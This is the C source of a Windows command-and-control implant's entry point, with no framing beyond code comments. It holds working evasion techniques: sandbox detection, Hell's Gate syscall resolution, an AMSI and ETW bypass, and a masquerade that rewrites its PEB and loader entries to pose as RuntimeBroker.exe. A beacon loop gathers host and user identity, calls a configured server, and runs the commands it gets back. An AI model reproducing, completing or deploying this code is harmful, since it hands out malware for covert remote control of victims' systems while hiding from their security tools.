/*
 * entry.c — WinMain: initialise subsystems, run beacon loop.
 *
 * Startup sequence:
 *   1. Anti-sandbox gate  (IsSandbox → exit if detected)
 *   2. HellsGateInit      (PEB walk, SSN cache, gadget)
 *   3. CryptoInit         (load bcrypt.dll, derive AES key, BCrypt handles)
 *   4. EvasionInit        (VEH HWBP for AMSI + ETW)
 *   5. BeaconInit         (load winhttp.dll, resolve pointers)
 *   6. Populate AgentState
 *   7. Pre-beacon delay   (30–120 s, skipped in debug mode)
 *   8. Beacon loop        (send → execute → sleep)
 *
 * Kill-date and working-hours checks are evaluated each loop iteration.
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>


/* ── Global agent state ──────────────────────────────────────────────────── */
AgentState g_agent;

/* ── Time helpers ────────────────────────────────────────────────────────── */

/* Parse "YYYY-MM-DD" into SYSTEMTIME, return FALSE on empty/invalid */
static BOOL ParseDate(const char *s, SYSTEMTIME *st) {
    if (!s || s[0] == '\0') return FALSE;
    memset(st, 0, sizeof(*st));
    if (strlen(s) < 10) return FALSE;
    st->wYear  = (WORD)((s[0]-'0')*1000 + (s[1]-'0')*100 + (s[2]-'0')*10 + (s[3]-'0'));
    st->wMonth = (WORD)((s[5]-'0')*10 + (s[6]-'0'));
    st->wDay   = (WORD)((s[8]-'0')*10 + (s[9]-'0'));
    return (st->wYear > 2000 && st->wMonth >= 1 && st->wMonth <= 12);
}

static BOOL PastKillDate(void) {
    SYSTEMTIME kd;
    if (!ParseDate(CFG_KILL_DATE, &kd)) return FALSE;
    SYSTEMTIME now;
    GetSystemTime(&now);
    if (now.wYear  > kd.wYear)  return TRUE;
    if (now.wYear  < kd.wYear)  return FALSE;
    if (now.wMonth > kd.wMonth) return TRUE;
    if (now.wMonth < kd.wMonth) return FALSE;
    return now.wDay >= kd.wDay;
}

static BOOL WithinWorkHours(void) {
    if (!CFG_WORK_HOURS_ONLY) return TRUE;
    SYSTEMTIME lt;
    GetLocalTime(&lt);
    return (lt.wHour >= CFG_WORK_START && lt.wHour < CFG_WORK_END);
}

/* ── Jittered interval ────────────────────────────────────────────────────── */

static DWORD JitteredInterval(void) {
    DWORD base_ms = (DWORD)g_agent.base_interval * 1000;
    if (g_agent.jitter_pct <= 0) return base_ms;
    DWORD jitter_ms = base_ms * (DWORD)g_agent.jitter_pct / 100;
    if (jitter_ms == 0) return base_ms;
    DWORD rand_ms = RandDword() % jitter_ms;
    /* ± half jitter */
    return base_ms - jitter_ms / 2 + rand_ms;
}

/* ── Populate hostname / username ────────────────────────────────────────── */

static void PopulateIdentity(void) {
    /* Hostname */
    WCHAR whost[HOSTNAME_MAX] = {0};
    DWORD hlen = HOSTNAME_MAX;
    typedef BOOL (WINAPI *pfnGetComputerNameExW)(COMPUTER_NAME_FORMAT, LPWSTR, LPDWORD);
    pfnGetComputerNameExW pFn = (pfnGetComputerNameExW)(FARPROC)
        g_GetProcAddress(g_GetModuleHandleA(OBFSTR("kernel32.dll")), OBFSTR("GetComputerNameExW"));
    if (pFn) pFn(ComputerNameDnsHostname, whost, &hlen);
    WstrToStr(whost, g_agent.hostname, HOSTNAME_MAX);
    if (!g_agent.hostname[0]) xsnprintf(g_agent.hostname, HOSTNAME_MAX, "unknown");

    /* Username */
    WCHAR wuser[USERNAME_MAX] = {0};
    DWORD ulen = USERNAME_MAX;
    typedef BOOL (WINAPI *pfnGetUserNameW)(LPWSTR, LPDWORD);
    pfnGetUserNameW pUser = (pfnGetUserNameW)(FARPROC)
        g_GetProcAddress(g_LoadLibraryA(OBFSTR("advapi32.dll")), OBFSTR("GetUserNameW"));
    if (pUser) pUser(wuser, &ulen);
    WstrToStr(wuser, g_agent.username, USERNAME_MAX);
    if (!g_agent.username[0]) xsnprintf(g_agent.username, USERNAME_MAX, "unknown");

    /* PID */
    g_agent.pid = (int)GetCurrentProcessId();

    /* Admin check via token */
    g_agent.is_admin = 0;
    HANDLE hToken = NULL;
    if (OpenProcessToken((HANDLE)(LONG_PTR)-1, TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION te = {0};
        DWORD retLen = 0;
        if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &retLen))
            g_agent.is_admin = (int)te.TokenIsElevated;
        CloseHandle(hToken);
    }
}

/* ── PEB masquerade ──────────────────────────────────────────────────────── */
/* RTL_USER_PROCESS_PARAMETERS offsets (x64, all Win10/11) */
#define PEB_OFFSET_PROC_PARAMS  0x20
#define PP_OFFSET_IMAGE_PATH    0x60   /* UNICODE_STRING ImagePathName */
#define PP_OFFSET_CMDLINE       0x70   /* UNICODE_STRING CommandLine   */

static void PatchPEB(void) {
    BYTE *peb = (BYTE*)READ_GS_QWORD(0x60);
    BYTE *pp  = *(BYTE**)(peb + PEB_OFFSET_PROC_PARAMS);
    if (!pp) return;

    WCHAR fake_image[MAX_PATH];
    WCHAR fake_cmd[MAX_PATH];
    WOBFSTR("C:\\Windows\\System32\\RuntimeBroker.exe", fake_image, MAX_PATH);
    WOBFSTR("C:\\Windows\\System32\\RuntimeBroker.exe -Embedding", fake_cmd, MAX_PATH);

    WCHAR *strs[2]    = { fake_image, fake_cmd };
    int    offsets[2] = { PP_OFFSET_IMAGE_PATH, PP_OFFSET_CMDLINE };

    for (int i = 0; i < 2; i++) {
        WCHAR *src = strs[i];
        int nch = 0;
        while (src[nch]) nch++;
        SIZE_T nbytes = (SIZE_T)(nch + 1) * sizeof(WCHAR);
        PVOID  buf    = NULL;
        if (!NT_SUCCESS(NtAlloc((HANDLE)(LONG_PTR)-1, &buf, nbytes, PAGE_READWRITE)))
            continue;
        for (int j = 0; j <= nch; j++) ((WCHAR*)buf)[j] = src[j];
        BYTE *us = pp + offsets[i];
        *(USHORT*)(us + 0x00) = (USHORT)(nch * sizeof(WCHAR));
        *(USHORT*)(us + 0x02) = (USHORT)((nch + 1) * sizeof(WCHAR));
        *(WCHAR**)(us + 0x08) = (WCHAR*)buf;
    }
}

/* ── LDR entry masquerade ────────────────────────────────────────────────── */
/* Patch InLoadOrderModuleList entry for this process so tools that walk the
 * LDR (Process Hacker, Get-Process -Module, etc.) see RuntimeBroker.exe. */
static void PatchLDR(void) {
    BYTE *peb      = (BYTE*)READ_GS_QWORD(0x60);
    PVOID selfBase = *(PVOID*)(peb + 0x10);          /* PEB.ImageBaseAddress */
    PVOID ldr      = *(PVOID*)(peb + PEB_OFFSET_LDR);
    LIST_ENTRY *head = (LIST_ENTRY*)((BYTE*)ldr + LDR_OFFSET_INLOAD_LIST);

    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        PVOID dllBase = *(PVOID*)((BYTE*)e + LDR_ENTRY_OFFSET_DLLBASE);
        if (dllBase != selfBase) continue;

        WCHAR fake_full[MAX_PATH];
        WCHAR fake_base[32];
        WOBFSTR("C:\\Windows\\System32\\RuntimeBroker.exe", fake_full, MAX_PATH);
        WOBFSTR("RuntimeBroker.exe", fake_base, 32);

        WCHAR *strs[2]    = { fake_full,              fake_base };
        int    offsets[2] = { LDR_ENTRY_OFFSET_FULLNAME, LDR_ENTRY_OFFSET_BASENAME };

        for (int i = 0; i < 2; i++) {
            WCHAR *src = strs[i];
            int nch = 0;
            while (src[nch]) nch++;
            SIZE_T nbytes = (SIZE_T)(nch + 1) * sizeof(WCHAR);
            PVOID buf = NULL;
            if (!NT_SUCCESS(NtAlloc((HANDLE)(LONG_PTR)-1, &buf, nbytes, PAGE_READWRITE)))
                continue;
            for (int j = 0; j <= nch; j++) ((WCHAR*)buf)[j] = src[j];
            BYTE *us = (BYTE*)e + offsets[i];
            *(USHORT*)(us + 0x00) = (USHORT)(nch * sizeof(WCHAR));
            *(USHORT*)(us + 0x02) = (USHORT)((nch + 1) * sizeof(WCHAR));
            *(WCHAR**)(us + 0x08) = (WCHAR*)buf;
        }
        break;
    }
}

/* ── Derive AES key from CFG_ENC_KEY ─────────────────────────────────────── */

static void DeriveKey(void) {
    Sha256((const BYTE *)CFG_ENC_KEY, strlen(CFG_ENC_KEY), g_agent.aes_key);
}

/* ── Generate deterministic agent UUID ───────────────────────────────────── */

static void GenerateAgentID(void) {
    char seed[512];
    xsnprintf(seed, sizeof(seed), "%s|%s|%s|%s",
              g_agent.hostname, g_agent.username,
              CFG_SERVER_URL, CFG_INSTANCE_SALT);
    GenUUID(seed, g_agent.agent_id);
    SecureZero(seed, sizeof(seed));
}

/* ── WinMain ─────────────────────────────────────────────────────────────── */

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
                   LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrev; (void)lpCmdLine; (void)nCmdShow;

    /* 1. Anti-sandbox (skipped in debug mode) */
#if CFG_DEBUG == 0
    if (CFG_ENABLE_EVASION && IsSandbox()) ExitProcess(0);
#endif

    /* 2. Decode obfuscated string table (must be first after sandbox gate) */
    ObfInit();

    /* 3. Hell's Gate + call-stack gadgets */
    if (!HellsGateInit()) ExitProcess(1);
    InitCallstackGadgets(HellsGateNtdllBase());

    /* 4. Crypto */
    if (!CryptoInit()) ExitProcess(1);

    /* 4. AMSI + ETW bypass */
    if (CFG_ENABLE_EVASION) EvasionInit();

    /* 5. WinHTTP */
    if (!BeaconInit()) ExitProcess(1);

    /* 6. Identity + PEB/LDR masquerade */
    PopulateIdentity();
    PatchPEB();
    PatchLDR();
    DeriveKey();
    GenerateAgentID();

    /* 7. Config */
    g_agent.base_interval = CFG_INTERVAL_SEC;
    g_agent.jitter_pct    = CFG_JITTER_PCT;
    g_agent.sleep_mask    = (BOOL)CFG_SLEEP_MASKING;
    g_agent.evasion       = (BOOL)CFG_ENABLE_EVASION;

    /* 8. Kill-date guard */
    if (PastKillDate()) ExitProcess(0);

    /* 9. Pre-beacon delay (skip in debug) */
#if CFG_DEBUG == 0
    {
        BYTE rb[1];
        RandBytes(rb, 1);
        LONGLONG delaySec = 30 + (int)(rb[0] % 91);   /* 30–120 s */
        SecureZero(rb, sizeof(rb));
        NtDelay(delaySec * 10000000LL);
    }
#endif

    /* 10. Beacon loop */
    AgentCommand cmd;
    AgentResult *lastResult = NULL;

    for (;;) {
        if (PastKillDate()) ExitProcess(0);
        if (!WithinWorkHours()) {
            NtDelay(60LL * 10000000LL);  /* check again in 1 min */
            continue;
        }

        memset(&cmd, 0, sizeof(cmd));
        BOOL ok = BeaconSend(lastResult, &cmd);
        FreeResult(lastResult);
        lastResult = NULL;

        if (ok && cmd.type[0]) {
            lastResult = ExecuteCommand(&cmd);
        }
        SecureZero(&cmd, sizeof(cmd));

        LONGLONG sleepMs = (LONGLONG)JitteredInterval();
        if (g_agent.sleep_mask) {
            SleepMasked(sleepMs);
        } else {
            NtDelay(sleepMs * 10000LL);
        }
    }

    return 0;
}
